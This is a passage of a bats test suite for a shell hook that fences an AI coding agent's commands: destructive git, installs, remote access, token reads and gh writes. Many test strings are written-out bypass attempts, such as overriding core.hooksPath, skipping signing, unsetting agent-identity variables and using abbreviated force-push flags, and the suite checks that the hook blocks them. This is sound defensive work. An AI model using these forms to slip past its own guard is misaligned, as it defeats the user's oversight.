#!/usr/bin/env bats
# tests for stow/common/agent-hooks/.config/agent-hooks/block-dangerous.sh
# the policy reads a harness-neutral shell request and exits 2 to deny.

setup() {
    # the suite must not inherit a capability from the session that launched
    # it -- every case sets what it needs
    unset AGENT_UNFENCE
    HOOK="$BATS_TEST_DIRNAME/../../stow/common/agent-hooks/.config/agent-hooks/block-dangerous.sh"
}

# pipe a neutral shell request with the given command.
fire() {
    local cmd="$1"
    printf '{"version":1,"operation":"shell","command":%s}' "$(printf '%s' "$cmd" | jq -Rs .)" \
        | "$HOOK"
}

# -- destructive git ----------------------------------------------------

@test "blocks git push" {
    run fire "git push origin main"
    [ "$status" -eq 2 ]
}

@test "blocks git push --force" {
    run fire "git push --force"
    [ "$status" -eq 2 ]
}

@test "blocks git reset --hard" {
    run fire "git reset --hard HEAD"
    [ "$status" -eq 2 ]
}

@test "blocks bare git reset" {
    run fire "git reset"
    [ "$status" -eq 2 ]
}

@test "blocks git rebase" {
    run fire "git rebase main"
    [ "$status" -eq 2 ]
}

@test "blocks git cherry-pick" {
    run fire "git cherry-pick abc1234"
    [ "$status" -eq 2 ]
}

@test "blocks git reset --soft" {
    run fire "git reset --soft HEAD~1"
    [ "$status" -eq 2 ]
}

@test "blocks git merge" {
    run fire "git merge feature"
    [ "$status" -eq 2 ]
}

@test "blocks git filter-branch" {
    run fire "git filter-branch --tree-filter rm a"
    [ "$status" -eq 2 ]
}

@test "blocks gh pr merge" {
    run fire "gh pr merge 123"
    [ "$status" -eq 2 ]
}

@test "blocks git checkout ." {
    run fire "git checkout ."
    [ "$status" -eq 2 ]
}

@test "blocks git clean -fd" {
    run fire "git clean -fd"
    [ "$status" -eq 2 ]
}

@test "allows git status" {
    run fire "git status"
    [ "$status" -eq 0 ]
}

@test "allows git log" {
    run fire "git log --oneline -10"
    [ "$status" -eq 0 ]
}

@test "allows git diff" {
    run fire "git diff --cached"
    [ "$status" -eq 0 ]
}

# -- git config: reads through, writes fenced -----------------------------

@test "allows git config --get" {
    run fire "git config --get user.name"
    [ "$status" -eq 0 ]
}

@test "allows git config --get chained with another command" {
    run fire "git config --get core.hooksPath; echo done"
    [ "$status" -eq 0 ]
}

@test "allows a bare git config read chained with &&" {
    run fire "git config user.email && echo ok"
    [ "$status" -eq 0 ]
}

@test "blocks git config key value" {
    run fire "git config user.name mallory"
    [ "$status" -eq 2 ]
}

@test "blocks git config key value chained after a read" {
    run fire "git config --get user.name; git config user.name mallory"
    [ "$status" -eq 2 ]
}

@test "blocks git config --global" {
    run fire "git config --global user.email x@example.com"
    [ "$status" -eq 2 ]
}

# -- git config injection: -c / --config-env ------------------------------
# checked pre-strip -- the global-option normalisation would otherwise erase
# the override before any pattern sees it.

@test "blocks -c core.hooksPath" {
    run fire "git -c core.hooksPath=/dev/null commit -m x"
    [ "$status" -eq 2 ]
}

@test "blocks a glued -ccore.hooksPath" {
    run fire "git -ccore.hooksPath=/dev/null commit -m x"
    [ "$status" -eq 2 ]
}

@test "blocks -c commit.gpgsign=false" {
    run fire "git -c commit.gpgsign=false commit -m x"
    [ "$status" -eq 2 ]
}

@test "blocks a --config-env hook override" {
    run fire "git --config-env=core.hooksPath=EVIL commit -m x"
    [ "$status" -eq 2 ]
}

@test "allows a benign -c" {
    run fire "git -c color.ui=false log --oneline"
    [ "$status" -eq 0 ]
}

# glued global options must not dodge the subcommand anchors

@test "blocks git push behind a glued -c" {
    run fire "git -cfoo=bar push"
    [ "$status" -eq 2 ]
}

@test "blocks git push behind a glued -C" {
    run fire "git -C/tmp/repo push"
    [ "$status" -eq 2 ]
}

@test "blocks git push behind --config-env" {
    run fire "git --config-env=user.name=U push"
    [ "$status" -eq 2 ]
}

# -- gh api: reads through, writes fenced --------------------------------
# `gh api` field flags force a POST, so they read as writes. two things are
# reads regardless: an explicit GET method, and a graphql query -- the v4
# endpoint is POST-only and the query rides in a field, so there is no GET
# form of it. review-thread `isResolved` has no REST equivalent, so fencing
# graphql out costs a capability with no workaround.

@test "allows a rest read" {
    run fire "gh api repos/o/r/pulls/1/comments"
    [ "$status" -eq 0 ]
}

@test "allows gh pr view" {
    run fire "gh pr view 1 --json reviews"
    [ "$status" -eq 0 ]
}

@test "allows field flags behind an explicit GET" {
    run fire "gh api -X GET search/issues -f q=foo"
    [ "$status" -eq 0 ]
}

@test "allows a graphql read" {
    run fire "gh api graphql -f query='{ viewer { login } }'"
    [ "$status" -eq 0 ]
}

@test "allows a graphql read with typed variables" {
    run fire "gh api graphql -F owner=o -F name=r -f query='query(\$owner: String!, \$name: String!) { repository(owner: \$owner, name: \$name) { pullRequest(number: 1) { reviewThreads(first: 50) { nodes { isResolved isOutdated } } } } }'"
    [ "$status" -eq 0 ]
}

@test "allows a paginated graphql read" {
    run fire "gh api graphql --paginate --slurp -f query='query(\$endCursor: String) { viewer { repositories(first: 100, after: \$endCursor) { nodes { name } pageInfo { hasNextPage endCursor } } } }'"
    [ "$status" -eq 0 ]
}

@test "allows a graphql read piped into jq" {
    run fire "gh api graphql -f query='{ viewer { login } }' | jq -r .data.viewer.login"
    [ "$status" -eq 0 ]
}

@test "allows a graphql read with a leading slash" {
    run fire "gh api /graphql -f query='{ viewer { login } }'"
    [ "$status" -eq 0 ]
}

@test "blocks graphql behind a leading flag" {
    # endpoint has to be the first token. telling `graphql`-the-endpoint from
    # `graphql`-in-a-quoted-value needs a real parser, so the position is the
    # tell -- reorder the flags to get through.
    run fire "gh api --cache 1h graphql -f query='{ viewer { login } }'"
    [ "$status" -eq 2 ]
}

@test "blocks a graphql mutation" {
    run fire "gh api graphql -f query='mutation { addComment(input: {subjectId: \"x\", body: \"hi\"}) { clientMutationId } }'"
    [ "$status" -eq 2 ]
}

@test "blocks a named graphql mutation with variables" {
    run fire "gh api graphql -F id=x -f query='mutation Resolve(\$id: ID!) { resolveReviewThread(input: {threadId: \$id}) { thread { isResolved } } }'"
    [ "$status" -eq 2 ]
}

@test "blocks a graphql query read from a file" {
    run fire "gh api graphql -F query=@thread.graphql"
    [ "$status" -eq 2 ]
}

@test "blocks a graphql body read from stdin" {
    run fire "gh api graphql --input -"
    [ "$status" -eq 2 ]
}

@test "allows a graphql read via a full url endpoint" {
    run fire "gh api https://api.github.com/graphql -f query='{ viewer { login } }'"
    [ "$status" -eq 0 ]
}

@test "allows a read whose field name starts with mutation" {
    run fire "gh api graphql -f query='{ repository(owner: \"o\", name: \"r\") { mutationCount } }'"
    [ "$status" -eq 0 ]
}

@test "allows schema introspection" {
    run fire "gh api graphql -f query='{ __schema { mutationType { name } } }'"
    [ "$status" -eq 0 ]
}

@test "allows a read against a repo called mutation-testing" {
    run fire "gh api graphql -f query='{ repository(owner: \"o\", name: \"mutation-testing\") { id } }'"
    [ "$status" -eq 0 ]
}

@test "allows a graphql read piped into jq naming a mutation field" {
    run fire "gh api graphql -f query='{ viewer { login } }' | jq '.data | select(.mutationCount == null)'"
    [ "$status" -eq 0 ]
}

@test "blocks a mutation with no space before the brace" {
    run fire "gh api graphql -f query='mutation{ deleteIssue(input: {}) { clientMutationId } }'"
    [ "$status" -eq 2 ]
}

@test "blocks graphql behind an explicit write method" {
    run fire "gh api -X POST graphql -f query='{ viewer { login } }'"
    [ "$status" -eq 2 ]
}

@test "blocks a rest write chained after a graphql read" {
    run fire "gh api graphql -f query='{ viewer { login } }' ; gh api repos/o/r/issues -f title=x"
    [ "$status" -eq 2 ]
}

@test "blocks a rest write &&-chained after a graphql read" {
    run fire "gh api graphql -f query='{ viewer { login } }' && gh api repos/o/r/issues -f title=x"
    [ "$status" -eq 2 ]
}

@test "blocks a rest write on the line after a graphql read" {
    run fire "gh api graphql -f query='{ viewer { login } }'
gh api repos/o/r/issues -f title=x"
    [ "$status" -eq 2 ]
}

@test "blocks a mutation hidden behind a quoted pipe" {
    run fire "gh api graphql -f query='{ search(query: \"a|b\") { c } } mutation E { deleteIssue(input: {}) { clientMutationId } }'"
    [ "$status" -eq 2 ]
}

@test "blocks a rest write chained after a GET read" {
    run fire "gh api -X GET search/issues -f q=foo ; gh api repos/o/r/issues -f title=x"
    [ "$status" -eq 2 ]
}

@test "blocks a rest write whose path merely contains graphql" {
    run fire "gh api repos/o/graphql-parser/issues -f title=x"
    [ "$status" -eq 2 ]
}

@test "blocks a glued short field flag" {
    run fire "gh api repos/o/r/issues -fbody=hi"
    [ "$status" -eq 2 ]
}

@test "blocks a glued long field flag" {
    run fire "gh api repos/o/r/issues --field=body=hi"
    [ "$status" -eq 2 ]
}

@test "blocks a glued --input" {
    run fire "gh api repos/o/r/rulesets --input=body.json"
    [ "$status" -eq 2 ]
}

# -- gh subcommands: reads through, writes fenced ------------------------

@test "allows gh issue develop --list" {
    run fire "gh issue develop --list 123"
    [ "$status" -eq 0 ]
}

@test "allows gh issue develop -l" {
    run fire "gh issue develop 123 -l"
    [ "$status" -eq 0 ]
}

@test "blocks gh issue develop" {
    run fire "gh issue develop 123"
    [ "$status" -eq 2 ]
}

@test "blocks gh issue develop with a branch name ending in -l" {
    run fire "gh issue develop 123 --name feature-l"
    [ "$status" -eq 2 ]
}

@test "blocks gh issue develop chained after an unrelated -l" {
    run fire "ls -l ; gh issue develop 123"
    [ "$status" -eq 2 ]
}

@test "allows gh gist clone" {
    run fire "gh gist clone 5b0e0062eb8e9654adad7bb1d81cc75f"
    [ "$status" -eq 0 ]
}

@test "blocks gh gist create" {
    run fire "gh gist create notes.txt"
    [ "$status" -eq 2 ]
}

@test "allows gh repo deploy-key list" {
    run fire "gh repo deploy-key list"
    [ "$status" -eq 0 ]
}

@test "blocks gh repo deploy-key add" {
    run fire "gh repo deploy-key add key.pub"
    [ "$status" -eq 2 ]
}

@test "blocks gh repo deploy-key delete" {
    run fire "gh repo deploy-key delete 1"
    [ "$status" -eq 2 ]
}

@test "blocks gh pr co (checkout alias)" {
    run fire "gh pr co 32"
    [ "$status" -eq 2 ]
}

@test "blocks gh co (top-level checkout alias)" {
    run fire "gh co 32"
    [ "$status" -eq 2 ]
}

@test "blocks gh pr revert" {
    run fire "gh pr revert 123"
    [ "$status" -eq 2 ]
}

@test "allows gh pr checks" {
    run fire "gh pr checks 123"
    [ "$status" -eq 0 ]
}

@test "allows gh pr diff" {
    run fire "gh pr diff 123"
    [ "$status" -eq 0 ]
}

@test "allows gh completion (not the co alias)" {
    run fire "gh completion -s fish"
    [ "$status" -eq 0 ]
}

# gated on purpose despite being reads: a token in agent context is an
# exfil surface, and the other two move the worktree off what is checked
# out. gist clone is not one of them -- it only ever writes a new dir.

@test "blocks gh auth token" {
    run fire "gh auth token"
    [ "$status" -eq 2 ]
}

@test "blocks gh repo sync" {
    run fire "gh repo sync"
    [ "$status" -eq 2 ]
}

@test "blocks gh pr checkout" {
    run fire "gh pr checkout 32"
    [ "$status" -eq 2 ]
}

@test "allows gh issue list" {
    run fire "gh issue list --state open"
    [ "$status" -eq 0 ]
}

@test "allows gh secret list" {
    run fire "gh secret list"
    [ "$status" -eq 0 ]
}

# -- gpg bypass ---------------------------------------------------------

@test "blocks --no-gpg-sign" {
    run fire "git commit --no-gpg-sign -m x"
    [ "$status" -eq 2 ]
}

# -- installs -----------------------------------------------------------

@test "blocks brew install" {
    run fire "brew install jq"
    [ "$status" -eq 2 ]
}

@test "blocks pip install" {
    run fire "pip install requests"
    [ "$status" -eq 2 ]
}

@test "blocks pipx install" {
    run fire "pipx install black"
    [ "$status" -eq 2 ]
}

@test "blocks uv pip install" {
    run fire "uv pip install foo"
    [ "$status" -eq 2 ]
}

@test "blocks uv tool install" {
    run fire "uv tool install ruff"
    [ "$status" -eq 2 ]
}

@test "blocks npm install -g" {
    run fire "npm install -g typescript"
    [ "$status" -eq 2 ]
}

@test "blocks npm i -g" {
    run fire "npm i -g typescript"
    [ "$status" -eq 2 ]
}

@test "blocks cargo install" {
    run fire "cargo install ripgrep"
    [ "$status" -eq 2 ]
}

@test "blocks go install" {
    run fire "go install github.com/x/y@latest"
    [ "$status" -eq 2 ]
}

@test "blocks apt install" {
    run fire "sudo apt install ripgrep"
    [ "$status" -eq 2 ]
}

@test "blocks apt-get install" {
    run fire "sudo apt-get install ripgrep"
    [ "$status" -eq 2 ]
}

@test "blocks pip install when chained after another command" {
    run fire "cd /tmp && pip install foo"
    [ "$status" -eq 2 ]
}

@test "allows project-local npm ci" {
    run fire "npm ci"
    [ "$status" -eq 0 ]
}

@test "allows project-local uv sync" {
    run fire "uv sync"
    [ "$status" -eq 0 ]
}

@test "allows cargo build" {
    run fire "cargo build --release"
    [ "$status" -eq 0 ]
}

@test "allows npm install (project-local, no -g)" {
    run fire "npm install"
    [ "$status" -eq 0 ]
}

# -- remote ops ---------------------------------------------------------

@test "blocks ssh" {
    run fire "ssh host whoami"
    [ "$status" -eq 2 ]
}

@test "blocks scp" {
    run fire "scp file host:/tmp/"
    [ "$status" -eq 2 ]
}

@test "blocks kubectl exec" {
    run fire "kubectl exec pod -- ls"
    [ "$status" -eq 2 ]
}

@test "blocks gcloud compute ssh" {
    run fire "gcloud compute ssh my-vm"
    [ "$status" -eq 2 ]
}

@test "allows kubectl get" {
    run fire "kubectl get pods"
    [ "$status" -eq 0 ]
}

@test "allows ssh-keygen (not the ssh command itself)" {
    run fire "ssh-keygen -y -f key"
    [ "$status" -eq 0 ]
}

# -- whitespace must not open a hole ------------------------------------
# a stray double space or a wrapped line is a formatting slip, not an
# evasion -- neither may drop the fence.

@test "blocks git push with a double space" {
    run fire "git  push"
    [ "$status" -eq 2 ]
}

@test "blocks git push with a tab" {
    run fire "git$(printf '\t')push"
    [ "$status" -eq 2 ]
}

@test "blocks gh pr create with double spaces" {
    run fire "gh  pr  create --title x"
    [ "$status" -eq 2 ]
}

@test "blocks brew install with a double space" {
    run fire "brew  install foo"
    [ "$status" -eq 2 ]
}

@test "blocks a line-continued git push" {
    run fire "git \\
push"
    [ "$status" -eq 2 ]
}

@test "blocks git push on the second line of a script" {
    run fire "cd /tmp/ai
git push"
    [ "$status" -eq 2 ]
}

@test "blocks npm install --global (long flag)" {
    run fire "npm install --global foo"
    [ "$status" -eq 2 ]
}

@test "blocks git push behind --exec-path" {
    run fire "git --exec-path=/usr/bin push"
    [ "$status" -eq 2 ]
}

@test "blocks autossh" {
    run fire "autossh -M 0 host"
    [ "$status" -eq 2 ]
}

# -- benign commands ----------------------------------------------------

@test "allows ls" {
    run fire "ls -la"
    [ "$status" -eq 0 ]
}

@test "allows echo" {
    run fire "echo hello"
    [ "$status" -eq 0 ]
}

# -- the branch capability ----------------------------------------------
# AGENT_UNFENCE=branch lifts the branch / worktree category only. read from
# the policy's own environment, so the user grants it at launch.

@test "branch allows git branch <name>" {
    AGENT_UNFENCE=branch run fire "git branch feature/x"
    [ "$status" -eq 0 ]
}

@test "branch allows git switch" {
    AGENT_UNFENCE=branch run fire "git switch main"
    [ "$status" -eq 0 ]
}

@test "branch allows git checkout -b" {
    AGENT_UNFENCE=branch run fire "git checkout -b feature/x"
    [ "$status" -eq 0 ]
}

@test "branch allows git checkout of an existing branch" {
    AGENT_UNFENCE=branch run fire "git checkout main"
    [ "$status" -eq 0 ]
}

@test "branch allows git worktree add" {
    AGENT_UNFENCE=branch run fire "git worktree add ../wt feature/x"
    [ "$status" -eq 0 ]
}

@test "branch does not lift the destructive category" {
    AGENT_UNFENCE=branch run fire "git branch -D feature/x"
    [ "$status" -eq 2 ]
}

@test "branch does not lift push" {
    AGENT_UNFENCE=branch run fire "git push origin feature/x"
    [ "$status" -eq 2 ]
}

@test "branch does not lift rebase" {
    AGENT_UNFENCE=branch run fire "git rebase main"
    [ "$status" -eq 2 ]
}

@test "an unrelated capability does not lift the branch fence" {
    AGENT_UNFENCE=meta run fire "git switch main"
    [ "$status" -eq 2 ]
}

@test "an empty AGENT_UNFENCE does not lift the branch fence" {
    AGENT_UNFENCE= run fire "git switch main"
    [ "$status" -eq 2 ]
}

@test "a substring of a capability name does not lift the branch fence" {
    AGENT_UNFENCE=branchy run fire "git switch main"
    [ "$status" -eq 2 ]
}

@test "the capability cannot be granted from inside the command text" {
    run fire "env AGENT_UNFENCE=branch git switch main"
    [ "$status" -eq 2 ]
}

# -- the history capability -----------------------------------------------
# AGENT_UNFENCE=history lifts rebase / cherry-pick / reset --soft only.
# reset --hard, bare reset, and everything else stay blocked regardless.

@test "history allows git rebase" {
    AGENT_UNFENCE=history run fire "git rebase main"
    [ "$status" -eq 0 ]
}

@test "history allows git cherry-pick" {
    AGENT_UNFENCE=history run fire "git cherry-pick abc1234"
    [ "$status" -eq 0 ]
}

@test "history allows git reset --soft" {
    AGENT_UNFENCE=history run fire "git reset --soft HEAD~1"
    [ "$status" -eq 0 ]
}

@test "history allows bare git reset --soft (no ref)" {
    AGENT_UNFENCE=history run fire "git reset --soft"
    [ "$status" -eq 0 ]
}

@test "history does not lift git reset --hard" {
    AGENT_UNFENCE=history run fire "git reset --hard HEAD"
    [ "$status" -eq 2 ]
}

@test "history does not lift git reset --mixed" {
    AGENT_UNFENCE=history run fire "git reset --mixed HEAD~1"
    [ "$status" -eq 2 ]
}

@test "history does not lift bare git reset" {
    AGENT_UNFENCE=history run fire "git reset"
    [ "$status" -eq 2 ]
}

@test "history does not lift push --force" {
    AGENT_UNFENCE=history run fire "git push --force"
    [ "$status" -eq 2 ]
}

@test "history does not lift the branch category" {
    AGENT_UNFENCE=history run fire "git switch main"
    [ "$status" -eq 2 ]
}

@test "an unrelated capability does not lift the history fence" {
    AGENT_UNFENCE=branch run fire "git rebase main"
    [ "$status" -eq 2 ]
}

@test "an empty AGENT_UNFENCE does not lift the history fence" {
    AGENT_UNFENCE= run fire "git rebase main"
    [ "$status" -eq 2 ]
}

@test "a substring of a capability name does not lift the history fence" {
    AGENT_UNFENCE=historyish run fire "git rebase main"
    [ "$status" -eq 2 ]
}

@test "the history capability cannot be granted from inside the command text" {
    run fire "env AGENT_UNFENCE=history git rebase main"
    [ "$status" -eq 2 ]
}

# -- the remote capability ------------------------------------------------
# AGENT_UNFENCE=remote lifts the remote-env category as a whole: ssh, scp,
# autossh, kubectl exec, gcloud compute ssh. git push is its own category
# and stays blocked regardless.

@test "remote allows ssh" {
    AGENT_UNFENCE=remote run fire "ssh host whoami"
    [ "$status" -eq 0 ]
}

@test "remote allows ssh with a user@host target" {
    AGENT_UNFENCE=remote run fire "ssh lczyk@cantril.local uptime"
    [ "$status" -eq 0 ]
}

@test "remote allows scp" {
    AGENT_UNFENCE=remote run fire "scp file host:/tmp/"
    [ "$status" -eq 0 ]
}

@test "remote allows autossh" {
    AGENT_UNFENCE=remote run fire "autossh -M 0 host"
    [ "$status" -eq 0 ]
}

@test "remote allows kubectl exec" {
    AGENT_UNFENCE=remote run fire "kubectl exec pod -- ls"
    [ "$status" -eq 0 ]
}

@test "remote allows gcloud compute ssh" {
    AGENT_UNFENCE=remote run fire "gcloud compute ssh my-vm"
    [ "$status" -eq 0 ]
}

@test "remote does not lift push" {
    AGENT_UNFENCE=remote run fire "git push origin main"
    [ "$status" -eq 2 ]
}

@test "remote does not lift the branch category" {
    AGENT_UNFENCE=remote run fire "git switch main"
    [ "$status" -eq 2 ]
}

@test "remote does not lift the history category" {
    AGENT_UNFENCE=remote run fire "git rebase main"
    [ "$status" -eq 2 ]
}

@test "remote does not lift installs" {
    AGENT_UNFENCE=remote run fire "brew install jq"
    [ "$status" -eq 2 ]
}

@test "remote does not lift a chained push after an ssh" {
    AGENT_UNFENCE=remote run fire "ssh host uptime && git push origin main"
    [ "$status" -eq 2 ]
}

@test "remote composes with other capabilities" {
    AGENT_UNFENCE=branch,remote run fire "ssh host whoami"
    [ "$status" -eq 0 ]
}

@test "an unrelated capability does not lift the remote fence" {
    AGENT_UNFENCE=branch run fire "ssh host whoami"
    [ "$status" -eq 2 ]
}

@test "an empty AGENT_UNFENCE does not lift the remote fence" {
    AGENT_UNFENCE= run fire "ssh host whoami"
    [ "$status" -eq 2 ]
}

@test "a substring of a capability name does not lift the remote fence" {
    AGENT_UNFENCE=remotely run fire "ssh host whoami"
    [ "$status" -eq 2 ]
}

@test "the remote capability cannot be granted from inside the command text" {
    run fire "env AGENT_UNFENCE=remote ssh host whoami"
    [ "$status" -eq 2 ]
}

# -- the push capability --------------------------------------------------
# AGENT_UNFENCE=push lifts a fast-forward `git push` to a configured remote by
# name. the forms that rewrite or delete remote refs, skip pre-push, push in
# bulk, or name a url or path stay blocked under every capability.

@test "push allows bare git push" {
    AGENT_UNFENCE=push run fire "git push"
    [ "$status" -eq 0 ]
}

@test "push allows git push origin <branch>" {
    AGENT_UNFENCE=push run fire "git push origin feature/x"
    [ "$status" -eq 0 ]
}

@test "push allows git push -u origin <branch>" {
    AGENT_UNFENCE=push run fire "git push -u origin feature/x"
    [ "$status" -eq 0 ]
}

@test "push allows --set-upstream" {
    AGENT_UNFENCE=push run fire "git push --set-upstream origin feature/x"
    [ "$status" -eq 0 ]
}

@test "push allows a HEAD:refs/heads refspec" {
    AGENT_UNFENCE=push run fire "git push origin HEAD:refs/heads/feature/x"
    [ "$status" -eq 0 ]
}

@test "push allows a branch:branch refspec" {
    AGENT_UNFENCE=push run fire "git push origin feature/x:feature/x"
    [ "$status" -eq 0 ]
}

@test "push allows quiet, verbose and dry-run flags" {
    AGENT_UNFENCE=push run fire "git push -q -v --dry-run origin feature/x"
    [ "$status" -eq 0 ]
}

@test "push allows -n (dry-run)" {
    AGENT_UNFENCE=push run fire "git push -n origin feature/x"
    [ "$status" -eq 0 ]
}

@test "push allows --no-follow-tags" {
    AGENT_UNFENCE=push run fire "git push --no-follow-tags origin feature/x"
    [ "$status" -eq 0 ]
}

@test "push allows -o push options" {
    AGENT_UNFENCE=push run fire "git push -o ci.skip origin feature/x"
    [ "$status" -eq 0 ]
}

@test "push allows a push chained after a commit" {
    AGENT_UNFENCE=push run fire "git commit -m 'feat: x' && git push"
    [ "$status" -eq 0 ]
}

@test "push allows git push behind a stripped -C" {
    AGENT_UNFENCE=push run fire "git -C /tmp/ai/repo push origin feature/x"
    [ "$status" -eq 0 ]
}

@test "push allows git push behind -c of an unrelated key" {
    AGENT_UNFENCE=push run fire "git -c user.name=U push origin feature/x"
    [ "$status" -eq 0 ]
}

@test "push allows a folded double-space git push" {
    AGENT_UNFENCE=push run fire "git  push origin feature/x"
    [ "$status" -eq 0 ]
}

@test "push allows a line-continued git push" {
    AGENT_UNFENCE=push run fire "git push \\
origin feature/x"
    [ "$status" -eq 0 ]
}

# force -- every spelling

@test "push does not lift --force" {
    AGENT_UNFENCE=push run fire "git push --force origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift --force after the refspec" {
    AGENT_UNFENCE=push run fire "git push origin feature/x --force"
    [ "$status" -eq 2 ]
}

@test "push does not lift -f" {
    AGENT_UNFENCE=push run fire "git push -f origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift -f combined with -u (either order)" {
    AGENT_UNFENCE=push run fire "git push -fu origin feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "git push -uf origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift --force-with-lease" {
    AGENT_UNFENCE=push run fire "git push --force-with-lease origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift --force-with-lease=<ref>:<sha>" {
    AGENT_UNFENCE=push run fire "git push --force-with-lease=feature/x:abc123 origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift --force-if-includes" {
    AGENT_UNFENCE=push run fire "git push --force-with-lease --force-if-includes origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift a +refspec" {
    AGENT_UNFENCE=push run fire "git push origin +feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift a +HEAD:branch refspec" {
    AGENT_UNFENCE=push run fire "git push origin +HEAD:main"
    [ "$status" -eq 2 ]
}

@test "push does not lift a line-continued --force" {
    AGENT_UNFENCE=push run fire "git push origin feature/x \\
--force"
    [ "$status" -eq 2 ]
}

# delete

@test "push does not lift --delete" {
    AGENT_UNFENCE=push run fire "git push --delete origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift -d" {
    AGENT_UNFENCE=push run fire "git push -d origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift a :branch delete refspec" {
    AGENT_UNFENCE=push run fire "git push origin :feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift a bare : (push all matching)" {
    AGENT_UNFENCE=push run fire "git push origin :"
    [ "$status" -eq 2 ]
}

# bulk

@test "push does not lift --mirror" {
    AGENT_UNFENCE=push run fire "git push --mirror origin"
    [ "$status" -eq 2 ]
}

@test "push does not lift --prune" {
    AGENT_UNFENCE=push run fire "git push --prune origin"
    [ "$status" -eq 2 ]
}

@test "push does not lift --all" {
    AGENT_UNFENCE=push run fire "git push --all origin"
    [ "$status" -eq 2 ]
}

@test "push does not lift --branches" {
    AGENT_UNFENCE=push run fire "git push --branches origin"
    [ "$status" -eq 2 ]
}

@test "push does not lift --tags" {
    AGENT_UNFENCE=push run fire "git push --tags origin"
    [ "$status" -eq 2 ]
}

# git accepts any unambiguous prefix of a long option

@test "push does not lift abbreviated long options" {
    local abbrev
    for abbrev in --force-w --force-with --force-i --de --del --dele --m --mi --mirr --pru --prun --al --b --br --branch --ta --tag --no-veri --no-verif --rece --receive --e --ex --exe --rep; do
        AGENT_UNFENCE=push run fire "git push $abbrev origin feature/x"
        [ "$status" -eq 2 ] || { echo "not blocked: $abbrev"; return 1; }
    done
}

@test "push does not lift the ambiguous --for / --forc spellings either" {
    AGENT_UNFENCE=push run fire "git push --for origin feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "git push --forc origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push keeps the harmless long options that share a prefix" {
    local flag
    for flag in --follow-tags --no-follow-tags --dry-run --porcelain --progress --atomic --thin --no-thin --set-upstream --push-option=x --signed --recurse-submodules=check --verbose --quiet --ipv4 --no-verbose --no-force-with-lease; do
        AGENT_UNFENCE=push run fire "git push $flag origin feature/x"
        [ "$status" -eq 0 ] || { echo "wrongly blocked: $flag"; return 1; }
    done
}

# redirects are files, not remotes

@test "push allows output redirected to a log file" {
    AGENT_UNFENCE=push run fire "git push origin feature/x > /tmp/ai/log/push.log 2>&1"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=push run fire "git push origin feature/x >/tmp/ai/log/push.log 2>/dev/null"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=push run fire "git push origin feature/x 2>&1 | tee /tmp/ai/log/push.log"
    [ "$status" -eq 0 ]
}

@test "push does not lift a substituted target or refspec" {
    AGENT_UNFENCE=push run fire "git push origin \$(cat /tmp/ai/target)"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "git push \$REMOTE feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "git push \${REMOTE} feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "git push origin \`cat /tmp/ai/target\`"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "git push origin \$'feature/x'"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "git push -u origin \"\$(git branch --show-current)\""
    [ "$status" -eq 2 ]
}

@test "push allows HEAD in place of a substituted branch name" {
    AGENT_UNFENCE=push run fire "git push -u origin HEAD"
    [ "$status" -eq 0 ]
}

@test "push still blocks a url target next to a redirect" {
    AGENT_UNFENCE=push run fire "git push /tmp/ai/bare.git feature/x > /tmp/ai/log/push.log"
    [ "$status" -eq 2 ]
}

# plumbing that skips pre-push

@test "push does not lift git send-pack" {
    AGENT_UNFENCE=push run fire "git send-pack origin feature/x"
    [ "$status" -eq 2 ]
    run fire "git send-pack --force origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift git http-push" {
    AGENT_UNFENCE=push run fire "git http-push https://host/o/r.git feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift the remote transport helpers" {
    AGENT_UNFENCE=push run fire "git remote-https origin"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "git-remote-https origin https://host/o/r.git"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "git remote-ssh origin"
    [ "$status" -eq 2 ]
}

@test "git remote reads are not mistaken for a transport helper" {
    run fire "git remote -v"
    [ "$status" -eq 0 ]
    run fire "git remote show origin"
    [ "$status" -eq 0 ]
}

# the hooks read the agent markers from the environment

@test "push does not lift a push with the agent markers unset" {
    AGENT_UNFENCE=push run fire "env -u CLAUDECODE git push origin feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "env --unset=AGENT_SESSION -u OPENCODE_PID git push origin feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "unset CLAUDECODE AGENT_SESSION; git push origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift a push with the agent markers rewritten" {
    AGENT_UNFENCE=push run fire "CLAUDECODE=0 git push origin feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "env AGENT_SESSION= git push origin feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "export CLAUDECODE=; git push origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift a push under an emptied environment" {
    AGENT_UNFENCE=push run fire "env -i PATH=/usr/bin git push origin feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "env --ignore-environment git push origin feature/x"
    [ "$status" -eq 2 ]
}

# one-shot aliases and the environment reach the same layers

@test "a -c alias one-shot is blocked, capability or not" {
    run fire "git -c alias.p=push p origin feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "git -c alias.p=push p origin feature/x"
    [ "$status" -eq 2 ]
